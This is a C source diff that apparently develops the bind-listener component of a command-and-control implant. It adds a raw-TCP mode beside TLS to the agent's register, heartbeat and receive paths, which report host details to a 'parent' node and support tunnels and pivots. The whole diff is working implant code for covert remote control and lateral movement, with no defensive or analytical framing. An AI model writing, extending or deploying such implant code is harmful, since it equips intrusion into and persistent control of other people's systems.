@@ -39,6 +39,7 @@ int nax_build_reg_body(const char *, uint32_t, const char *, uint32_t,
                        uint32_t, uint32_t, uint16_t,
                        uint32_t, uint32_t, uint32_t,
                        const char *, uint32_t,
+                       uint8_t,
                        uint8_t *, uint32_t *);
 int nax_build_heartbeat(uint8_t *, uint32_t *);
 int nax_build_no_tasks(uint8_t *, uint32_t *);
@@ -314,11 +315,26 @@ static void ssl_ref_release(void) {
 }
 
 static int send_encrypted(NaxAgent *a, int sock, uint8_t *frame, uint32_t frame_len) {
-    (void)sock;
-    SSL *ssl = ssl_ref_acquire();
-    if (!ssl) return -1;
-    int rc = tls_send_encrypted(a, ssl, frame, frame_len);
-    ssl_ref_release();
+    uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK;
+    uint8_t *enc = malloc(enc_cap);
+    if (!enc) return -1;
+    uint32_t enc_len = enc_cap;
+    int rc = nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len);
+    if (rc < 0) { free(enc); return -1; }
+
+    SSL *ssl = ssl_ref_acquire();  /* NULL if raw mode or closing */
+    if (ssl) {
+        rc = tls_lp_send(ssl, enc, enc_len);
+        ssl_ref_release();
+    } else {
+        /* raw mode — send directly on sock with length prefix */
+        pthread_mutex_lock(&g_sock_mutex);
+        int s = g_tunnel_sock;
+        pthread_mutex_unlock(&g_sock_mutex);
+        if (s < 0) { free(enc); return -1; }
+        rc = lp_send(s, enc, enc_len);
+    }
+    free(enc);
     return rc;
 }
 
@@ -371,6 +387,7 @@ static int do_register(NaxAgent *a, int sock) {
             info.os_major, info.os_minor, info.os_build,
             info.ppid, 0, 0,
             info.imgpath, strlen(info.imgpath),
+            0,  /* jitter_pct: bind agent has no compiled-in jitter */
             reg_body, &reg_body_len) < 0) return -1;
 
     uint8_t *frame = malloc(NAX_IO_CAP);
@@ -400,7 +417,8 @@ static int do_register(NaxAgent *a, int sock) {
     memcpy(beat+4+16+NAX_SID_LEN, enc, enc_len);
     free(enc);
 
-    int rc = tls_lp_send(g_cli_ssl, beat, beat_len);
+    int rc = g_cli_ssl ? tls_lp_send(g_cli_ssl, beat, beat_len)
+                       : lp_send(sock, beat, beat_len);
     free(beat);
     return rc;
 }
@@ -415,12 +433,10 @@ extern uint32_t nax_process_tunnels_ex(NaxAgent *a, uint8_t *out, uint32_t out_c
 
 
 static int do_heartbeat(NaxAgent *a, int sock) {
-    (void)sock;
     uint8_t  frame[NAX_FRAME_HDR + 64];
     uint32_t frame_len = sizeof(frame);
     if (nax_build_heartbeat(frame, &frame_len) < 0) return -1;
-    if (!g_cli_ssl) return -1;
-    return tls_send_encrypted(a, g_cli_ssl, frame, frame_len);
+    return send_encrypted(a, sock, frame, frame_len);
 }
 
 /* ===== process_pivots_bind =============================================
@@ -640,13 +656,37 @@ void nax_tcp_bind_main(NaxAgent *a) {
     while (a->running) {
         int cli = accept(srv, NULL, NULL);
         if (cli < 0) { if (errno==EINTR) continue; break; }
-        DBG("parent connected — TLS handshake");
-        g_cli_ssl = tls_accept(cli);
-        if (!g_cli_ssl) { DBG_ERR("TLS accept failed"); close(cli); continue; }
-        DBG("TLS established");
+        /* Auto-detect TLS vs raw:
+         * Peek the first byte with a short timeout (500ms).
+         * - TLS ClientHello: first byte = 0x16 (record type Handshake)
+         * MSG_PEEK + SO_RCVTIMEO lets us branch without consuming bytes. */
+        int is_tls = 0;
+        {
+            struct timeval tv = { 0, 500000 }; /* 500ms */
+            setsockopt(cli, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+            uint8_t peek[1] = {0};
+            ssize_t n = recv(cli, peek, 1, MSG_PEEK);
+            tv.tv_sec = 0; tv.tv_usec = 0;
+            setsockopt(cli, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+            is_tls = (n == 1 && peek[0] == 0x16);
+        }
+
+        if (is_tls) {
+            DBG("parent connected — TLS handshake");
+            g_cli_ssl = tls_accept(cli);
+            if (!g_cli_ssl) { DBG_ERR("TLS accept failed"); close(cli); continue; }
+            DBG("TLS established");
+        } else {
+            DBG("parent connected — raw TCP (no TLS)");
+            g_cli_ssl = NULL;
+        }
 
         DBG("sending REGISTER beat");
-        if (do_register(a, cli) < 0) { DBG("REGISTER failed"); SSL_shutdown(g_cli_ssl); SSL_free(g_cli_ssl); g_cli_ssl = NULL; close(cli); continue; }
+        if (do_register(a, cli) < 0) {
+            DBG("REGISTER failed");
+            if (g_cli_ssl) { SSL_shutdown(g_cli_ssl); SSL_free(g_cli_ssl); g_cli_ssl = NULL; }
+            close(cli); continue;
+        }
         DBG("REGISTER sent OK");
 
         /* Set global parent socket for tunnel reader threads */
@@ -770,7 +810,9 @@ void nax_tcp_bind_main(NaxAgent *a) {
                 free(pfds);
                 uint8_t *raw     = NULL;
                 uint32_t raw_len = 0;
-                if (tls_lp_recv(g_cli_ssl, &raw, &raw_len) < 0) { DBG("tls_lp_recv failed"); break; }
+                int recv_rc = g_cli_ssl ? tls_lp_recv(g_cli_ssl, &raw, &raw_len)
+                                        : lp_recv(cli, &raw, &raw_len);
+                if (recv_rc < 0) { DBG("lp_recv failed"); break; }
                 DBG("received %u bytes from parent", raw_len);
                 int rc = handle_parent_data(a, cli, raw, raw_len);
                 free(raw);
@@ -791,6 +833,7 @@ void nax_tcp_bind_main(NaxAgent *a) {
         pthread_mutex_unlock(&g_sock_mutex);
         if (g_cli_ssl) { SSL_shutdown(g_cli_ssl); SSL_free(g_cli_ssl); g_cli_ssl = NULL; }
         close(cli);
+        DBG("parent session closed, waiting for next connection");
         gen_session_id(a->session_id);
     }
 
